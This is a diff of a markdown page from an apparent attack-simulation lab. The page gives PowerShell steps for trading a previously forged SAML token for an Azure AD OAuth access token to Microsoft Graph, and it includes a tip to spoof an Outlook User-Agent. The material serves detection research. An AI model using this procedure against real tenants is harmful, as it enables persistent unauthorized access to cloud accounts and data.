@@ -8,48 +8,43 @@ This type of flow supports users authenticating with identity providers such as 
 
 In this document, we are going to use an existing SAML token to exchange it for an OAuth access token from Azure active directory (Azure AD).
 
-## Simulate & Detect
-1.	[Encode SAML token](#encode-saml-token)
-2.	[Create OAuth HTTP POST request](#create-oauth-http-post-request)
-3.	[Send HTTP POST request to the Microsoft identity platform token endpoint](#send-http-post-request-to-the-microsoft-identity-platform-token-endpoint)
-4.  [Get OAuth access token from results](#get-oauth-access-token-from-results)
+## Table of Contents
+
+* [Preconditions](#preconditions)
+* [Simulation Steps](#simulation-steps)
+* [Output](#output)
 
 ## Preconditions
-* A trust relationship between the authorization server/environment (Microsoft 365) and the identity provider, or issuer of the SAML 2.0 bearer assertion (AD FS server)
-* Endpoint: AD FS Server (ADFS01)
-    * Even when this step would happen outside of the organization, we can use the same PowerShell session where we [signed a new SAML token](../credential-access/signSAMLToken.md) to go through the simulation steps.
-* A valid SAML bearer token
-    * Use the output from that previous step where we [signed a new SAML token](../credential-access/signSAMLToken.md) as the variable `$SamlToken`.
-* Application ID:
-    * The ID of the application (`appId`) we want to use to request the OAuth token (e.g Public Azure AD Application = `1b730954-1685-4b74-9bfd-dac224a7b894`).
-* Scope:
-    * A space-separated list of scopes, or permissions, that the app requires (e.g. Microsoft Graph = `"https://graph.microsoft.com/.default`).
-* Client secret (optional):
-    * If your app is a public client, then `the client_secret` cannot be included. If the app is a confidential client (Your own app), then it must be included in the OAuth HTTP request.
+* Input:
+    * SAML Token
+    * Azure AD Application ID: The ID of the application (`appId`) to request the OAuth token (e.g Public Azure AD Application = `1b730954-1685-4b74-9bfd-dac224a7b894`).
+    * Scope: A space-separated list of scopes, or permissions, that the app requires (e.g. Microsoft Graph = `"https://graph.microsoft.com/.default`).
+    * Client secret (optional):
+        * If your app is a public client, then `the client_secret` cannot be included. If the app is a confidential client (Your own app), then it must be included in the OAuth HTTP request.
 
-## Encode SAML token
+## Simulation Steps
 
-1.  Take a SAML token and base64 encode it to use it in the OAuth HTTP request.
+### Encode SAML token
 
-![](../../resources/images/simulate_detect/persistence/getOAuthTokenWithSAMLAssertion/2021-05-19_01_saml_token.png)
- 
-2.  Open a PowerShell console and run the following command to base64 encode it:
+1. Open a PowerShell console and run the following command to base64 encode a SAML token to later use it in an OAuth HTTP request:
 
 ```PowerShell
 $encodedSamlToken = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($SamlToken))
 ```
 
+![](../../resources/images/simulate_detect/persistence/getOAuthTokenWithSAMLAssertion/2021-05-19_01_saml_token.png)
+
 ![](../../resources/images/simulate_detect/persistence/getOAuthTokenWithSAMLAssertion/2021-05-19_02_token_encoded.png)
 
-## Create OAuth HTTP POST request
+### Create OAuth HTTP POST request
 
-### HTTP header
+#### HTTP header
 
 You can, for example, set the user Agent to look like `Microsoft Outlook` or other known applications.
 
 ```PowerShell
 $headers = @{
-    “Content-Type” = “application/x-www-form-urlencoded”
+    "Content-Type" = "application/x-www-form-urlencoded"
     "User-Agent" = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; Microsoft Outlook 16.0.4266)"
 }
 $headers
@@ -57,7 +52,7 @@ $headers
 
 ![](../../resources/images/simulate_detect/persistence/getOAuthTokenWithSAMLAssertion/2021-05-19_03_http_header.png)
 
-### HTTP body
+#### HTTP body
 
 Use the following parameters:
 
@@ -108,7 +103,7 @@ $secret = 'xxxxxx'
 $body['client_secret'] = $secret
 ```
 
-## Send HTTP POST request to the Microsoft identity platform token endpoint
+### Send HTTP POST request to the Microsoft identity platform token endpoint
 
 Send the OAuth token request to the OAuth 2.0 (v2) token endpoint: `https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token`
 
@@ -128,7 +123,7 @@ $results
 ![](../../resources/images/simulate_detect/persistence/getOAuthTokenWithSAMLAssertion/2021-05-19_07_send_oauth_http_request.png)
 
 
-# Get OAuth Access Token from Results
+### Get OAuth Access Token from Results
 
 ```PowerShell
 $OAuthAccessToken = $results.access_token
@@ -141,7 +136,8 @@ You can inspect your token here: [jwt.ms: Welcome!](https://jwt.ms/)
 
 ## Output
 
-Use the variable `$OAuthAccessToken` to call the API defined in the `scope` parameter of the HTTP body.
+* OAuth Access Token
+    * Use the variable `$OAuthAccessToken` to call the API defined in the `scope` parameter of the HTTP body.
 
 ## References
 * [Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)](https://o365blog.com/post/adfs/)
